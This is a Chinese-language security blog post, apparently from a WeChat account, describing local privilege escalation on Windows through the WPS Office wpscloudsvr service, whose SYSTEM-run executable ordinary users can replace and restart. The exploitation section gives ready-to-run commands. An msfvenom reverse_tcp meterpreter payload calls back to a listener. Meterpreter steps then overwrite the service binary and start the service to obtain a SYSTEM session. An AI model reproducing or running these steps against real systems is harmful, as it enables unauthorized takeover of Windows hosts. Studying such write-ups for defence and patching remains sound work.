> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/70D9SCrhLjU9mQHs-t6Nkw)
| 

**声明：**该公众号大部分文章来自作者日常学习笔记，也有少部分文章是经过原作者授权和其他公众号白名单转载，未经授权，严禁转载，如需转载，联系开白。

请勿利用文章内的相关技术从事非法测试，如因此产生的一切不良后果与文章作者和本公众号无关。

 |

**0x01 前言**

wpscloudsvr 服务用于提供 WPSOffice 云服务，其中包括：云文档，文件安全性，VIP 服务等，以实现完整和安全的用户体验，及时更新和错误修复，停止此服务将禁用云服务和及时错误修复等。  

但这个服务貌似并没有起到其实际作用，因为它默认为停止状态，启动类型为禁止或者手动，而且运行的是 WPSOffice 安装目录下的 wpscloudsvr.exe，并非该服务指定的 wpscloudsvr.exe。

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOcZQhwN6iaoFRaJ5WOd4ZVTBF7iaCxleU4wrsOBGUTC4CMHhoTszatmrQT02mEpuLVhlCN4ZxnJwhicg/640?wx_fmt=png)

**本地测试环境信息：**

```
操作系统：Windows 10教育版17134、Windows Server 2016 Datacenter
软件版本：WPS Office 2020 11.1.0.9999
WPS Office安装路径：D:\WPS Office\
WPS Office进程名：wps.exe、wpscloudsvr.exe等
WPS Office服务名：wpscloudsvr（WPS Office Cloud Service）
```

**0x02 绕过原理分析**

WPSOffice 在安装时创建的 wpscloudsvr 服务默认是以 SYSTEM 权限运行的，而且允许在 ApplicationPoolIdentity、NetworkService 和未过 UAC 的用户启动和停止该服务，并且有权限替换服务指定的 wpscloudsvr.exe，所以能够直接利用这种方式进行权限提升，但需要注意以下几点。

1. 不是所有服务都可以用未过 UAC 的用户来启动和停止的，如：KugouService、Everything 等；

2. wpscloudsvr.exe Users 权限问题，Win10 和 2016 默认给的权限不一样，可能会替换不了文件；

3. WPSOffic 新版本中可能已经修复该问题，可以替换文件，但是不能启动 wpscloudsvr 服务；

```
get-acl .\wpscloudsvr.exe | format-list
icacls wpscloudsvr.exe
net start wpscloudsvr
```

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOcZQhwN6iaoFRaJ5WOd4ZVTBpc2ZBaDTH1p5JJPHwtOicHIDUzibwJDsrGIwZlblH6N5dCgulNr6QqbQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOcZQhwN6iaoFRaJ5WOd4ZVTBibfMmoib1Yib0ERDRIooRM0S5U0qICyV6PH9Pms92t7qNsEKH2bx77ia2w/640?wx_fmt=png)

**0x02 模拟实战测试**

(1) 使用 MSF 下的 post/windows/gather/enum_services 模块获取当前主机上的服务信息，找到一个以 SYSTEM 权限运行的 wpscloudsvr 服务，并且可用 net 命令停止和开启该服务。  

```
meterpreter > run post/windows/gather/enum_services
```

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOcZQhwN6iaoFRaJ5WOd4ZVTBibCq3M0Zq7KEcuPGSdNelDyKy6WDnd0BcMt8zdM7EDM1OS1iaWljEzUw/640?wx_fmt=png)

(2) 既然有权限启动和停止 wpscloudsvr 服务，那么我们就直接将该服务的可执行文件替换为远控马或 MSF 攻击载荷，不过必须拥有 Users 完全控制权限才可替换，替换前记得备份一下，然后依次执行以下命令并重启 wpscloudsvr 服务后即可得到一个 SYSTEM 权限会话。

```
root@kali:~# msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.120 LPORT=443-f exe > /tmp/wpscloudsvr.exe

meterpreter > cd C:\\ProgramData\\Kingsoft\\office6\\
meterpreter > cp wpscloudsvr.exe wpscloudsvr1.exe
meterpreter > upload /tmp/wpscloudsvr.exe wpscloudsvr.exe
meterpreter > execute -Hc -i -f "c:\\windows\\system32\\cmd.exe" -a "/c net start wpscloudsvr"
```

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOcZQhwN6iaoFRaJ5WOd4ZVTBIibbwbhBjZsVmQunI0t3mMicBxdqFJicB8DbZ7fMeAPAUiaXmbzfp1Gibmw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOcZQhwN6iaoFRaJ5WOd4ZVTBt9Xzia5LqCGJ7ZYSyrjgB4r8as65ziaWmRHbmWwa8YCu9GcqXjgoykgw/640?wx_fmt=png)

**参考文章：**

[https://mp.weixin.qq.com/s/s1xWapre2xa5bAP-VoY_Ww](https://mp.weixin.qq.com/s?__biz=MzI5MDE0MjQ1NQ==&mid=2247491103&idx=1&sn=62957c6216e5d6744ab9662c04a53955&scene=21#wechat_redirect)

只需在公众号回复 “9527” 即可领取一套 HTB 靶场学习文档和视频，“1120” 领取安全参考等安全杂志 PDF 电子版，“1208” 领取一份常用高效爆破字典，还在等什么？

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOfSyD5Wo2fTiaYRzt5iaWg1GJk2Cx54PBIoc0Ia3z1yIfeyfUV61mn3skB5bGP3QHicHudVjMEGhqH4A/640?wx_fmt=png)